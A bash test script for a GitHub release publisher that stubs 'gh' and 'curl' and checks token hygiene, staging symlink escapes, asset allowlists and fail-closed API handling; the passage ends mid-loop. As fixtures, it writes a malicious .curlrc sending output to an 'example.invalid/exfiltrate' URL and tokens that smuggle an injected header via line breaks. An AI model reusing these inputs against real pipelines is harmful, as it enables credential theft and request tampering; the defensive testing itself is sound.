#!/usr/bin/env bash
set -euo pipefail

ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
PUBLISH=$ROOT/scripts/ci/publish-release.sh
WORKFLOW=$ROOT/.github/workflows/build-rootfs-and-grub.yml
camera_deb_asset=$(python3 -I -B "$ROOT/scripts/ci/camera-package-policy.py" deb-name)
camera_checksum_asset=$(python3 -I -B "$ROOT/scripts/ci/camera-package-policy.py" checksum-name)
scratch=$(mktemp -d)
cleanup() {
  case $scratch in /tmp/tmp.*) rm -rf -- "$scratch" ;; esac
}
trap cleanup EXIT INT TERM

fakebin=$scratch/fakebin
mkdir -p "$fakebin"
cat > "$fakebin/sleep" <<'SH'
#!/bin/sh
exit 0
SH
cat > "$fakebin/curl" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
: "${GH_STATE:?}"
: "${AUTH_SENTINEL_FILE:?}"
mkdir -p "$GH_STATE"

release_token=$(cat "$AUTH_SENTINEL_FILE")
process_cmdline=$(tr '\0' '\n' < "/proc/$$/cmdline")
process_environ=$(tr '\0' '\n' < "/proc/$$/environ")
case $process_cmdline in
  *"$release_token"*)
    printf 'release token leaked through curl argv\n' >&2
    exit 2
    ;;
esac
case $process_environ in
  *"$release_token"*)
    printf 'release token leaked through curl environment\n' >&2
    exit 2
    ;;
esac
while IFS= read -r environment_entry; do
  case $environment_entry in
    GH_TOKEN=*|GITHUB_TOKEN=*|HOME=*|CURL_HOME=*)
      printf 'sensitive publisher variable leaked through curl environment: %s\n' \
        "${environment_entry%%=*}" >&2
      exit 2
      ;;
  esac
done <<< "$process_environ"
printf 'process-auth-clean\n' >> "$GH_STATE/curl-process-inspection.log"

printf '%q ' "$@" >> "$GH_STATE/curl-calls.log"
printf '\n' >> "$GH_STATE/curl-calls.log"
[ "${1:-}" = --disable ] || {
  printf 'curl config loading was not disabled by the first argument\n' >&2
  exit 2
}
shift

method=
data=
url=
accept=false
authorization=false
api_version=false
content_type=false
while [ "$#" -gt 0 ]; do
  case $1 in
    --fail-with-body|--silent|--show-error) shift ;;
    --request) method=$2; shift 2 ;;
    --header)
      case $2 in
        'Accept: application/vnd.github+json') accept=true ;;
        @-)
          IFS= read -r auth_header
          [ "$auth_header" = "Authorization: Bearer $release_token" ]
          if IFS= read -r extra_auth_line; then
            printf 'curl received more than one authentication header line\n' >&2
            exit 2
          fi
          printf 'stdin-authenticated\n' >> "$GH_STATE/curl-stdin-auth.log"
          authorization=true
          ;;
        'X-GitHub-Api-Version: 2022-11-28') api_version=true ;;
        'Content-Type: application/octet-stream') content_type=true ;;
        *) printf 'unexpected curl header: %s\n' "$2" >&2; exit 2 ;;
      esac
      shift 2
      ;;
    --upload-file) [ -z "$data" ]; data=$2; shift 2 ;;
    https://*) [ -z "$url" ]; url=$1; shift ;;
    *) printf 'unexpected curl argument: %s\n' "$1" >&2; exit 2 ;;
  esac
done
[ "$method" = POST ]
$accept
$authorization
$api_version
$content_type
[ -f "$GH_STATE/exists" ]
[ "$(cat "$GH_STATE/draft")" = true ]
[ "$(cat "$GH_STATE/id")" = 101 ]
prefix=https://uploads.github.com/repos/owner/repository/releases/101/assets?name=
case $url in
  "$prefix"*) name=${url#"$prefix"} ;;
  *) printf 'unexpected upload URL: %s\n' "$url" >&2; exit 2 ;;
esac
[[ $name =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]]
[[ $data = /* && ${data##*/} = "$name" ]]
file=$data
[ -f "$file" ]
printf 'upload-start %s\n' "$name" >> "$GH_STATE/events.log"
[ "${GH_FAIL_UPLOAD:-0}" != 1 ] || exit 73
if awk -F '\t' -v name="$name" '$1 == name { found = 1 } END { exit found ? 0 : 1 }' "$GH_STATE/assets.tsv"; then
  printf 'duplicate upload asset: %s\n' "$name" >&2
  exit 67
fi
size=$(stat -c '%s' "$file")
digest=sha256:$(sha256sum "$file" | awk '{print $1}')
if [ "${GH_CORRUPT_DIGEST:-0}" = 1 ]; then
  digest=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
fi
printf '%s\t%s\t%s\n' "$name" "$size" "$digest" >> "$GH_STATE/assets.tsv"
printf 'upload-complete %s\n' "$name" >> "$GH_STATE/events.log"
SH

cat > "$fakebin/gh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
: "${GH_STATE:?}"
: "${AUTH_SENTINEL_FILE:?}"
: "${GH_TOKEN:?}"
[ "$GH_TOKEN" = "$(cat "$AUTH_SENTINEL_FILE")" ]
mkdir -p "$GH_STATE"
printf '%q ' "$@" >> "$GH_STATE/calls.log"
printf '\n' >> "$GH_STATE/calls.log"


if [ "${1:-}" = api ]; then
  shift
  method=GET
  include=false
  headers=()
  endpoint=
  while [ "$#" -gt 0 ]; do
    case $1 in
      -X) method=$2; shift 2 ;;
      -i|--include) include=true; shift ;;
      -H|--header) headers+=("$2"); shift 2 ;;
      *) endpoint=$1; shift; break ;;
    esac
  done
  [ -n "$endpoint" ] || exit 2
  query=
  paginate=false
  fields=()
  while [ "$#" -gt 0 ]; do
    case $1 in
      --paginate) paginate=true; shift ;;
      -i|--include) include=true; shift ;;
      -H|--header) headers+=("$2"); shift 2 ;;
      --jq) query=$2; shift 2 ;;
      -f|-F) fields+=("$2"); shift 2 ;;
      *) printf 'unexpected api argument: %s\n' "$1" >&2; exit 2 ;;
    esac
  done
  if [ "$method" = POST ]; then
    case $endpoint in
      repos/owner/repository/git/refs)
        printf 'publisher attempted to create a tag before the release API\n' >&2
        exit 2
        ;;
      repos/owner/repository/releases)
        [ "${GH_FAIL_RELEASE_CREATE:-0}" != 1 ] || exit 72
        [ ! -f "$GH_STATE/exists" ] || exit 66
        tag=
        target=
        name=
        body=
        draft=
        prerelease=
        for field in "${fields[@]}"; do
          key=${field%%=*}
          value=${field#*=}
          case $key in
            tag_name) tag=$value ;;
            target_commitish) target=$value ;;
            name) name=$value ;;
            body) body=$value ;;
            draft) draft=$value ;;
            prerelease) prerelease=$value ;;
            *) printf 'unexpected release POST field: %s\n' "$key" >&2; exit 2 ;;
          esac
        done
        [ "$tag" = test-20260715 ]
        [[ $target =~ ^[0-9a-f]{40}$ ]]
        [ "$name" = "$tag" ]
        [[ $body == @* ]]
        [ -f "${body#@}" ]
        [ "$draft" = true ]
        [ "$prerelease" = true ]
        tag_target=${GH_CREATE_TAG_TARGET:-$target}
        if [ "${GH_DRAFT_DEFER_TAG:-1}" != 1 ]; then
          : > "$GH_STATE/tag-exists"
        fi
        printf '%s\n' "$tag" > "$GH_STATE/tag"
        if [ "${GH_ANNOTATED_TAG:-0}" = 1 ]; then
          printf 'tag\n' > "$GH_STATE/tag-type"
          printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' > "$GH_STATE/tag-object"
          printf 'commit\n' > "$GH_STATE/peeled-type"
          printf '%s\n' "$tag_target" > "$GH_STATE/peeled-object"
        else
          printf 'commit\n' > "$GH_STATE/tag-type"
          printf '%s\n' "$tag_target" > "$GH_STATE/tag-object"
        fi
        reported_tag=${GH_RELEASE_TAG_RESPONSE:-$tag}
        reported_target=${GH_RELEASE_TARGET_RESPONSE:-$target}
        reported_name=${GH_RELEASE_NAME_RESPONSE:-$name}
        body_b64=$(base64 -w 0 < "${body#@}")
        reported_body_b64=${GH_RELEASE_BODY_B64_RESPONSE:-$body_b64}
        : > "$GH_STATE/exists"
        printf '%s\n' "$reported_tag" > "$GH_STATE/tag"
        printf '%s\n' "$reported_target" > "$GH_STATE/target"
        printf '%s\n' "$reported_name" > "$GH_STATE/name"
        printf '%s\n' "$reported_body_b64" > "$GH_STATE/body-b64"
        printf 'true\n' > "$GH_STATE/draft"
        printf '%s\n' "$prerelease" > "$GH_STATE/prerelease"
        printf '101\n' > "$GH_STATE/id"
        : > "$GH_STATE/assets.tsv"
        printf 'create-draft\n' >> "$GH_STATE/events.log"
        [ "$query" = '[.id, .tag_name, (.draft | tostring), .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)] | @tsv' ]
        printf '101\t%s\ttrue\t%s\ttrue\t%s\t%s\n' \
          "$reported_tag" "$reported_target" "$reported_name" "$reported_body_b64"
        ;;
      *) printf 'unexpected POST endpoint: %s\n' "$endpoint" >&2; exit 2 ;;
    esac
    exit
  fi
  [ "$method" != PATCH ] || {
    printf 'publisher attempted unsupported release PATCH\n' >&2
    exit 2
  }

  case "$endpoint" in
    'repos/owner/repository/releases?per_page=100')
      [ "${GH_FAIL_RELEASE_LIST:-0}" != 1 ] || exit 70
      [ "$paginate" = true ] || exit 69
      [ "$query" = '.[].tag_name' ] || exit 2
      [ ! -f "$GH_STATE/exists" ] || cat "$GH_STATE/tag"
      exit
      ;;
    repos/owner/repository/git/matching-refs/tags/*)
      [ "${GH_FAIL_REF_LIST:-0}" != 1 ] || exit 71
      [ "${GH_FAIL_DRAFT_REF_LIST:-0}" != 1 ] || [ ! -f "$GH_STATE/exists" ] || exit 72
      [ "${GH_PREFIX_TAG:-0}" != 1 ] || printf 'refs/tags/%s\n' test-20260715-other
      [ ! -f "$GH_STATE/tag-exists" ] || printf 'refs/tags/%s\n' test-20260715
      exit
      ;;
    repos/owner/repository/git/ref/tags/*)
      [ -f "$GH_STATE/tag-exists" ] || exit 1
      [ "$query" = '[.object.type, .object.sha] | @tsv' ] || exit 2
      if [ -n "$query" ]; then
        printf '%s\t%s\n' "$(cat "$GH_STATE/tag-type")" "$(cat "$GH_STATE/tag-object")"
      fi
      exit
      ;;
    repos/owner/repository/git/tags/*)
      [ -f "$GH_STATE/peeled-type" ] || exit 1
      printf '%s\t%s\n' "$(cat "$GH_STATE/peeled-type")" "$(cat "$GH_STATE/peeled-object")"
      exit
      ;;
    repos/owner/repository/releases/tags/*)
      [ -f "$GH_STATE/exists" ] || exit 44
      [ "$(cat "$GH_STATE/draft")" != true ] || exit 44
      ;;
  esac

  case "$endpoint" in
    repos/owner/repository/releases/101)
      [ "$query" = '["release", (.id | tostring), (.draft | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)] | @tsv' ] || exit 2
      count=0
      [ ! -f "$GH_STATE/snapshot-count" ] || count=$(cat "$GH_STATE/snapshot-count")
      count=$((count + 1))
      printf '%s\n' "$count" > "$GH_STATE/snapshot-count"
      id=$(cat "$GH_STATE/id")
      draft=$(cat "$GH_STATE/draft")
      tag=$(cat "$GH_STATE/tag")
      target=$(cat "$GH_STATE/target")
      prerelease=$(cat "$GH_STATE/prerelease")
      name=$(cat "$GH_STATE/name")
      body_b64=$(cat "$GH_STATE/body-b64")
      if [ "${GH_MUTATE_SNAPSHOT:-0}" -eq "$count" ]; then
        case ${GH_MUTATE_KIND:-target} in
          id) id=202 ;;
          draft) draft=false ;;
          tag) tag=other-tag ;;
          target) target=ffffffffffffffffffffffffffffffffffffffff ;;
          prerelease) prerelease=false ;;
          name) name=other-title ;;
          body) body_b64=b3RoZXItYm9keQ== ;;
          extra|digest) : ;;
          *) printf 'unknown mutation kind\n' >&2; exit 2 ;;
        esac
        printf 'external-mutation-%s\n' "${GH_MUTATE_KIND:-target}" >> "$GH_STATE/events.log"
      fi
      printf 'release\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$id" "$draft" "$tag" "$target" "$prerelease" "$name" "$body_b64"
      exit
      ;;
    'repos/owner/repository/releases/101/assets?per_page=100')
      [ "$paginate" = true ] || exit 69
      [ "$query" = '.[] | ["asset", .name, (.size | tostring), (.digest // "")] | @tsv' ] || exit 2
      count=0
      [ ! -f "$GH_STATE/snapshot-count" ] || count=$(cat "$GH_STATE/snapshot-count")
      if [ "${GH_MUTATE_SNAPSHOT:-0}" -eq "$count" ] && [ "${GH_MUTATE_KIND:-}" = digest ]; then
        awk -F '\t' 'BEGIN { OFS="\t" } NR == 1 { $3="sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" } { print }' \
          "$GH_STATE/assets.tsv" | sed 's/^/asset\t/'
      else
        sed 's/^/asset\t/' "$GH_STATE/assets.tsv"
      fi
      if [ "${GH_MUTATE_SNAPSHOT:-0}" -eq "$count" ] && [ "${GH_MUTATE_KIND:-}" = extra ]; then
        printf 'asset\tintruder.bin\t1\tsha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n'
      fi
      exit
      ;;
  esac

  case $query in
    .draft) cat "$GH_STATE/draft" ;;
    .target_commitish) cat "$GH_STATE/target" ;;
    .id) cat "$GH_STATE/id" ;;
    '.assets[].name') awk -F '\t' '{print $1}' "$GH_STATE/assets.tsv" ;;
    *) printf 'unexpected query: %s (%s)\n' "$query" "$endpoint" >&2; exit 2 ;;
  esac
  exit
fi

printf 'unexpected gh command: %s\n' "$*" >&2
exit 2
SH
chmod +x "$fakebin/gh" "$fakebin/sleep" "$fakebin/curl"

release_token="test-release-token-$RANDOM-$RANDOM-$$"
fallback_token="test-github-token-$RANDOM-$RANDOM-$$"
token_sentinel_file=$scratch/release-token-sentinel
printf '%s\n' "$release_token" > "$token_sentinel_file"

release_stage=$scratch/release-staging
release_dir=$release_stage/assets
mkdir -p "$release_dir"
fixed_assets=(
  BUILD-PARAMETERS.md boot.img.7z
  KERNEL-BUNDLE.tsv VERIFIED-BUNDLE.tsv VERIFIED-INPUTS.tsv
  KERNEL-SOURCE-LOCK.tsv SENSOR-SOURCE-LOCK.tsv HAPTICS-SOURCE-LOCK.tsv
  HAPTICS-BUILD-TOOLS.tsv MODULES.sha256 KERNEL-SDK-MANIFEST.tsv
  KERNEL-TOOLCHAIN.tsv KBUILD-FLAGS.tsv ROOTFS-PACKAGES.tsv
  APT-PROVENANCE.tsv APT-BOOTSTRAP.tsv APT-SOURCES.txt
  CAMERA-HANDOFF.tsv CAMERA-BUILD-REPORT.txt
  "$camera_deb_asset" "$camera_checksum_asset"
)
for asset in "${fixed_assets[@]}"; do
  case "$asset" in
    CAMERA-HANDOFF.tsv|CAMERA-BUILD-REPORT.txt|"$camera_deb_asset"|"$camera_checksum_asset") continue ;;
  esac
  printf 'fixture:%s\n' "$asset" > "$release_dir/$asset"
done
python3 -I -B "$ROOT/scripts/ci/test-camera-release-assets.py" --write-fixture "$release_dir"
printf 'fixture:rootfs\n' > "$release_dir/rootfs.img.7z.000"
printf 'fixture:grub\n' > "$release_dir/grub.img.7z"
(cd "$release_dir" &&
  find . -mindepth 1 -maxdepth 1 -type f ! -name SHA256SUMS.txt -printf '%f\0' |
    sort -z | xargs -0 sha256sum > SHA256SUMS.txt)

run_publish() {
  local state=$1
  local stage=${PUBLISH_STAGE_ROOT:-"$release_stage"}
  shift
  PATH="$fakebin:$PATH" GH_STATE="$state" \
    AUTH_SENTINEL_FILE="$token_sentinel_file" \
    GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
    GITHUB_REPOSITORY=owner/repository \
    GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 \
    GITHUB_RUN_ID=123456789 GITHUB_RUN_ATTEMPT=1 \
    "$@" bash "$PUBLISH" test-20260715 "$stage"
}

assert_curl_auth_hygiene() {
  local state=$1

  [ -s "$state/curl-process-inspection.log" ]
  [ -s "$state/curl-stdin-auth.log" ]
  if grep -Fq -- "$release_token" "$state/curl-calls.log"; then
    printf 'release token was recorded in curl arguments\n' >&2
    exit 1
  fi
}

state_token_newline=$scratch/state-token-newline
set +e
token_error=$(run_publish "$state_token_newline" env PRERELEASE=1 \
  GH_TOKEN=$'test-release-token\nInjected: value' 2>&1)
token_status=$?
set -e
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted a release token containing a line break\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN contains a forbidden line break' <<< "$token_error" || {
  printf 'newline token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_newline" ]

state_token_carriage_return=$scratch/state-token-carriage-return
set +e
token_error=$(run_publish "$state_token_carriage_return" env PRERELEASE=1 \
  GH_TOKEN=$'test-release-token\rInjected: value' 2>&1)
token_status=$?
set -e
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted a release token containing a carriage return\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN contains a forbidden line break' <<< "$token_error" || {
  printf 'carriage-return token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_carriage_return" ]

printf -v overlong_token '%4097s' ''
overlong_token=${overlong_token// /x}
state_token_overlong=$scratch/state-token-overlong
set +e
token_error=$(run_publish "$state_token_overlong" env PRERELEASE=1 \
  GH_TOKEN="$overlong_token" 2>&1)
token_status=$?
set -e
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted an overlong release token\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN exceeds the supported length' <<< "$token_error" || {
  printf 'overlong token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_overlong" ]
printf 'PASS unsafe release token framing is rejected before remote access\n'

outside=$scratch/outside
mkdir -p "$outside"
printf '# Outside Notes\n' > "$outside/BUILD-PARAMETERS.md"
ln -s "$outside" "$scratch/stage-root-link"
mkdir -p "$scratch/stage-assets-link"
ln -s "$outside" "$scratch/stage-assets-link/assets"
mkdir -p "$scratch/stage-notes-link/assets"
printf 'alpha\n' > "$scratch/stage-notes-link/assets/alpha.bin"
ln -s "$outside/BUILD-PARAMETERS.md" \
  "$scratch/stage-notes-link/assets/BUILD-PARAMETERS.md"

for fixture in stage-root-link stage-assets-link stage-notes-link; do
  state=$scratch/state-$fixture
  if PUBLISH_STAGE_ROOT="$scratch/$fixture" \
      run_publish "$state" env PRERELEASE=1 >/dev/null 2>&1; then
    printf 'publisher accepted symlinked or escaping release staging fixture: %s\n' "$fixture" >&2
    exit 1
  fi
  [ ! -e "$state" ]
done
printf 'PASS release staging rejects root, assets, and notes symlink escapes before remote access\n'

state_missing=$scratch/state-missing
if run_publish "$state_missing" env >/dev/null 2>&1; then
  printf 'publication without explicit prerelease mode was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_missing/calls.log" ]

state_false=$scratch/state-false
if run_publish "$state_false" env PRERELEASE=0 >/dev/null 2>&1; then
  printf 'normal/latest release mode was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_false/calls.log" ]
printf 'PASS publication requires explicit prerelease-only mode\n'

state_prerelease=$scratch/state-prerelease
run_publish "$state_prerelease" env PRERELEASE=1 >/dev/null
assert_curl_auth_hygiene "$state_prerelease"
printf 'PASS curl upload authentication stays out of argv and child environment\n'

copy_stage() {
  local destination=$1
  cp -a -- "$release_stage" "$destination"
}

refresh_manifest() {
  local stage=$1 dir="$1/assets"
  rm -f -- "$dir/SHA256SUMS.txt"
  (
    cd "$dir"
    find . -mindepth 1 -maxdepth 1 -type f ! -name SHA256SUMS.txt -printf '%f\0' |
      sort -z | xargs -0 sha256sum > SHA256SUMS.txt
  )
}

state_binary_marker=$scratch/state-binary-marker
binary_marker_stage=$scratch/stage-binary-marker
copy_stage "$binary_marker_stage"
sed -i '1s/  / */' "$binary_marker_stage/assets/SHA256SUMS.txt"
if ! PUBLISH_STAGE_ROOT="$binary_marker_stage" run_publish "$state_binary_marker" \
    env PRERELEASE=1 >/dev/null; then
  printf 'binary-mode checksum marker was rejected\n' >&2
  exit 1
fi
printf 'PASS binary-mode checksum entries are accepted\n'

state_extra_asset=$scratch/state-extra-asset
extra_asset_stage=$scratch/stage-extra-asset
copy_stage "$extra_asset_stage"
printf 'unexpected\n' > "$extra_asset_stage/assets/intruder.bin"
refresh_manifest "$extra_asset_stage"
if PUBLISH_STAGE_ROOT="$extra_asset_stage" run_publish "$state_extra_asset" \
    env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'unallowlisted local release asset was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_extra_asset/calls.log" ]
printf 'PASS local release asset allowlist rejects extras before remote access\n'

for camera_asset in CAMERA-HANDOFF.tsv CAMERA-BUILD-REPORT.txt "$camera_deb_asset" "$camera_checksum_asset"; do
  state=$scratch/state-missing-$camera_asset
  camera_stage=$scratch/stage-missing-$camera_asset
  copy_stage "$camera_stage"
  rm -f -- "$camera_stage/assets/$camera_asset"
  refresh_manifest "$camera_stage"
  if PUBLISH_STAGE_ROOT="$camera_stage" run_publish "$state" \
      env PRERELEASE=1 >/dev/null 2>&1; then
    printf 'missing camera publication asset was accepted: %s\n' "$camera_asset" >&2
    exit 1
  fi
  [ ! -f "$state/calls.log" ]
done
printf 'PASS camera package checksum handoff and report are required before remote access\n'

state_missing_asset=$scratch/state-missing-asset
missing_asset_stage=$scratch/stage-missing-asset
copy_stage "$missing_asset_stage"
rm -f -- "$missing_asset_stage/assets/APT-SOURCES.txt"
refresh_manifest "$missing_asset_stage"
if PUBLISH_STAGE_ROOT="$missing_asset_stage" run_publish "$state_missing_asset" \
    env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'missing fixed release asset was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_missing_asset/calls.log" ]
printf 'PASS required release inventory rejects missing fixed assets\n'

state_chunk_gap=$scratch/state-chunk-gap
chunk_gap_stage=$scratch/stage-chunk-gap
copy_stage "$chunk_gap_stage"
mv -- "$chunk_gap_stage/assets/rootfs.img.7z.000" \
  "$chunk_gap_stage/assets/rootfs.img.7z.002"
refresh_manifest "$chunk_gap_stage"
if PUBLISH_STAGE_ROOT="$chunk_gap_stage" run_publish "$state_chunk_gap" \
    env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'non-contiguous release image chunks were accepted\n' >&2
  exit 1
fi
[ ! -f "$state_chunk_gap/calls.log" ]
printf 'PASS release image chunk continuity is enforced\n'

state_aggregate=$scratch/state-aggregate
aggregate_stage=$scratch/stage-aggregate
copy_stage "$aggregate_stage"
truncate -s $((16 * 1024 * 1024 * 1024)) \
  "$aggregate_stage/assets/rootfs.img.7z.000"
if PUBLISH_STAGE_ROOT="$aggregate_stage" run_publish "$state_aggregate" \
    env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'release aggregate size cap was bypassed\n' >&2
  exit 1
fi
[ ! -f "$state_aggregate/calls.log" ]
printf 'PASS aggregate release asset size cap is enforced\n'

malicious_home=$scratch/malicious-curl-home
mkdir -p "$malicious_home"
curlrc_trace=$scratch/curlrc-trace.log
curlrc_exfiltration=$scratch/curlrc-exfiltration.log
{
  printf 'trace-ascii = "%s"\n' "$curlrc_trace"
  printf 'url = "https://example.invalid/exfiltrate"\n'
  printf 'output = "%s"\n' "$curlrc_exfiltration"
} > "$malicious_home/.curlrc"
state_xtrace=$scratch/state-xtrace
xtrace_log=$scratch/publisher-xtrace.log
PATH="$fakebin:$PATH" GH_STATE="$state_xtrace" \
  AUTH_SENTINEL_FILE="$token_sentinel_file" \
  GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
  GITHUB_REPOSITORY=owner/repository \
  GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 \
  GITHUB_RUN_ID=123456789 GITHUB_RUN_ATTEMPT=1 \
  PRERELEASE=1 HOME="$malicious_home" CURL_HOME="$malicious_home" \
  bash -x "$PUBLISH" test-20260715 "$release_stage" \
  >"$xtrace_log" 2>&1
assert_curl_auth_hygiene "$state_xtrace"
if grep -Fq -- "$release_token" "$xtrace_log" ||
   grep -Fq -- "$fallback_token" "$xtrace_log"; then
  printf 'publisher xtrace leaked a GitHub token\n' >&2
  exit 1
fi
[ ! -e "$curlrc_trace" ] || {
  printf 'malicious curl config enabled trace output\n' >&2
  exit 1
}
[ ! -e "$curlrc_exfiltration" ] || {
  printf 'malicious curl config added an output target\n' >&2
  exit 1
}
printf 'PASS publisher disables inherited xtrace and user curl configuration\n'
if grep -Fq 'repos/owner/repository/releases/tags/' "$state_prerelease/calls.log"; then
  printf 'draft release was queried through the tag endpoint\n' >&2
  exit 1
fi
[ "$(cat "$state_prerelease/draft")" = true ]
[ "$(cat "$state_prerelease/prerelease")" = true ]
[ ! -f "$state_prerelease/patch-fields.log" ]
[ ! -f "$state_prerelease/patch-headers.log" ]
if grep -Fq -- '-X PATCH' "$state_prerelease/calls.log" || \
   grep -Fq 'If-Match:' "$state_prerelease/calls.log"; then
  printf 'publisher attempted an unsupported conditional release update\n' >&2
  exit 1
fi
before=$(wc -l < "$state_prerelease/events.log")
if run_publish "$state_prerelease" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing verified draft was accepted on rerun\n' >&2
  exit 1
fi
[ "$before" -eq "$(wc -l < "$state_prerelease/events.log")" ]
printf 'PASS prerelease draft is verified, private, and immutable on rerun\n'

state_deferred=$scratch/state-deferred
run_publish "$state_deferred" env PRERELEASE=1 GH_DRAFT_DEFER_TAG=1 GH_PREFIX_TAG=1 >/dev/null
[ -s "$state_deferred/assets.tsv" ] && [ ! -f "$state_deferred/tag-exists" ]
[ "$(cat "$state_deferred/draft")" = true ]
if grep -Fq '/git/ref/tags/' "$state_deferred/calls.log" || grep -Fq '/releases/tags/' "$state_deferred/calls.log"; then
  printf 'unexpected tag endpoint for a deferred draft\n' >&2
  exit 1
fi
state_ref_error=$scratch/state-ref-error
if run_publish "$state_ref_error" env PRERELEASE=1 GH_DRAFT_DEFER_TAG=1 GH_FAIL_DRAFT_REF_LIST=1 >/dev/null 2>&1; then
  printf 'draft tag listing error treated as legitimate absence\n' >&2
  exit 1
fi
[ ! -s "$state_ref_error/assets.tsv" ]

for defer in 0 1; do
  state_wrong_target=$scratch/state-wrong-target-$defer
  if run_publish "$state_wrong_target" env PRERELEASE=1 GH_DRAFT_DEFER_TAG="$defer" GH_RELEASE_TARGET_RESPONSE=main >/dev/null 2>&1; then
    printf 'draft target branch substituted for exact SHA\n' >&2
    exit 1
  fi
  [ ! -s "$state_wrong_target/assets.tsv" ]
done
printf 'PASS deferred draft tag, exact target SHA, prefix and API-failure boundaries\n'

state_create_api_fail=$scratch/state-create-api-fail
if run_publish "$state_create_api_fail" env PRERELEASE=1 \
    GH_FAIL_RELEASE_CREATE=1 >/dev/null 2>&1; then
  printf 'release create API failure was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_create_api_fail/tag-exists" ]
[ ! -f "$state_create_api_fail/exists" ]
[ ! -f "$state_create_api_fail/patch-fields.log" ]

state_create_tag_mismatch=$scratch/state-create-tag-mismatch
if run_publish "$state_create_tag_mismatch" env PRERELEASE=1 \
    GH_RELEASE_TAG_RESPONSE=other-tag >/dev/null 2>&1; then
  printf 'release create API tag mismatch was accepted\n' >&2
  exit 1
fi
[ -f "$state_create_tag_mismatch/exists" ]
[ "$(cat "$state_create_tag_mismatch/draft")" = true ]
[ ! -f "$state_create_tag_mismatch/patch-fields.log" ]
printf 'PASS create API binds release id/tag and exact target commit\n'

for field in name body; do
  state=$scratch/state-create-$field-mismatch
  case $field in
    name) response=GH_RELEASE_NAME_RESPONSE=other-title ;;
    body) response=GH_RELEASE_BODY_B64_RESPONSE=b3RoZXItYm9keQ== ;;
  esac
  if run_publish "$state" env PRERELEASE=1 "$response" >/dev/null 2>&1; then
    printf 'release create %s mismatch was accepted\n' "$field" >&2
    exit 1
  fi
  [ -f "$state/exists" ]
  [ "$(cat "$state/draft")" = true ]
  [ ! -f "$state/patch-fields.log" ]
done
printf 'PASS create API binds release title and body to the staged notes asset\n'

state_invalid=$scratch/state-invalid
if run_publish "$state_invalid" env PRERELEASE=true >/dev/null 2>&1; then
  printf 'invalid PRERELEASE value was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_invalid/calls.log" ]
printf 'PASS invalid prerelease mode is rejected before remote access\n'

state_release_api_fail=$scratch/state-release-api-fail
if run_publish "$state_release_api_fail" env PRERELEASE=1 \
    GH_FAIL_RELEASE_LIST=1 >/dev/null 2>&1; then
  printf 'release inventory API failure was treated as absence\n' >&2
  exit 1
fi
[ ! -f "$state_release_api_fail/tag-exists" ]
[ ! -f "$state_release_api_fail/exists" ]

state_ref_api_fail=$scratch/state-ref-api-fail
if run_publish "$state_ref_api_fail" env PRERELEASE=1 \
    GH_FAIL_REF_LIST=1 >/dev/null 2>&1; then
  printf 'tag inventory API failure was treated as absence\n' >&2
  exit 1
fi
[ ! -f "$state_ref_api_fail/tag-exists" ]
[ ! -f "$state_ref_api_fail/exists" ]
printf 'PASS release and tag inventory failures are fail closed\n'

state_existing_tag=$scratch/state-existing-tag
mkdir -p "$state_existing_tag"
: > "$state_existing_tag/tag-exists"
printf 'commit\n' > "$state_existing_tag/tag-type"
printf '%s\n' 0123456789abcdef0123456789abcdef01234567 > "$state_existing_tag/tag-object"
if run_publish "$state_existing_tag" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing tag without a release was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_existing_tag/exists" ]
[ ! -f "$state_existing_tag/events.log" ]

state_tag_race=$scratch/state-tag-race
if run_publish "$state_tag_race" env PRERELEASE=1 \
    GH_DRAFT_DEFER_TAG=0 GH_CREATE_TAG_TARGET=ffffffffffffffffffffffffffffffffffffffff >/dev/null 2>&1; then
  printf 'racing mismatched tag target was accepted\n' >&2
  exit 1
fi
[ -f "$state_tag_race/exists" ]
[ "$(cat "$state_tag_race/draft")" = true ]
[ -f "$state_tag_race/tag-exists" ]
[ -f "$state_tag_race/assets.tsv" ]
[ ! -f "$state_tag_race/patch-fields.log" ]

state_annotated=$scratch/state-annotated
for kind in 0 1; do
  state_same_sha=$state_annotated-$kind
  if run_publish "$state_same_sha" env PRERELEASE=1 GH_DRAFT_DEFER_TAG=0 GH_ANNOTATED_TAG="$kind" >/dev/null 2>&1; then
    printf 'public tag at requested commit was incorrectly attributed to our private draft\n' >&2
